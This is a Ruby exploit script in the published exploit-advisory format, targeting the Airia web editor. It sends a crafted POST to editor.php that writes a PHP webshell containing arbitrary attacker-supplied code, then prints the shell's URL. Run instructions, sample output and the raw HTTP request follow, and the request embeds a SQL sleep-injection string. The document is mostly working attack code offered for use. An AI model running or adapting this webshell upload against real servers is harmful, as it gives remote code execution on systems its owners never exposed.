# Exploit Title: Airia - Webshell Upload Vulnerability
# Date: 2016-06-20
# Exploit Author: HaHwul
# Exploit Author Blog: www.hahwul.com
# Vendor Homepage: http://ytyng.com
# Software Link: https://github.com/ytyng/airia/archive/master.zip
# Version: Latest commit
# Tested on: Debian [wheezy]

require "net/http"
require "uri"

if ARGV.length !=2
puts "Airia Webshell Upload Exploit(Vulnerability)"
puts "Usage: #>ruby airia_ws_exploit.rb [targetURL] [phpCode]"
puts "  targetURL(ex): http://127.0.0.1/vul_test/airia"
puts "  phpCode(ex): echo 'zzzzz'"
puts "  Example : ~~.rb http://127.0.0.1/vul_test/airia 'echo zzzz'"
puts "  exploit & code by hahwul[www.hahwul.com]"

else

target_url = ARGV[0]    # http://127.0.0.1/jmx2-Email-Tester/
shell = ARGV[1]    # PHP Code
exp_url = target_url + "/editor.php"
uri = URI.parse(exp_url)
http = Net::HTTP.new(uri.host, uri.port)

request = Net::HTTP::Post.new(uri.request_uri)
request["Accept"] = "*/*"
request["User-Agent"] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
request["Connection"] = "close"
request["Referer"] = "http://127.0.0.1/vul_test/airia/editor.php?file=1&group=%281%20AND%20%28SELECT%20SLEEP%2830%29%29%29%20--%20"
request["Accept-Language"] = "en"
request["Content-Type"] = "application/x-www-form-urlencoded"
request.set_form_data({"mode"=>"save",""=>"","file"=>"shell.php","scrollvalue"=>"","contents"=>"<?php echo 'Airia Webshell Exploit';#{shell};?>","group"=>"vvv_html"})
response = http.request(request)

puts "[Result] Status code: "+response.code
puts "[Result] Open Browser: "+target_url+"/data/vvv_html/shell.php"
end

=begin
### Run Step.

#> ruby 3.rb http://127.0.0.1/vul_test/airia "echo 123;"
[Result] Status code: 302
[Result] Open Browser: http://127.0.0.1/vul_test/airia/data/vvv_html/shell.php

output: Airia Webshell Exploit123

### HTTP Request / Response
[Request]
POST /vul_test/airia/editor.php HTTP/1.1
Host: 127.0.0.1
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: http://127.0.0.1/vul_test/airia/editor.php?file=1&group=%281%20AND%20%28SELECT%20SLEEP%2830%29%29%29%20--%20
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Cookie: W2=dgf6v5tn2ea8uitvk98m2tfjl7; DBSR_session=01ltbc0gf3i35kkcf5f6o6hir1; __utma=96992031.1679083892.1466384142.1466384142.1466384142.1; __utmb=96992031.2.10.1466384142; __utmc=96992031; __utmz=96992031.1466384142.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)

mode=save&file=1.php&scrollvalue=&contents=<?php echo "Attack OK."?>&group=vvv_html

[Response] Uloaded file
http://127.0.0.1/vul_test/airia/data/vvv_html/1.html
=end

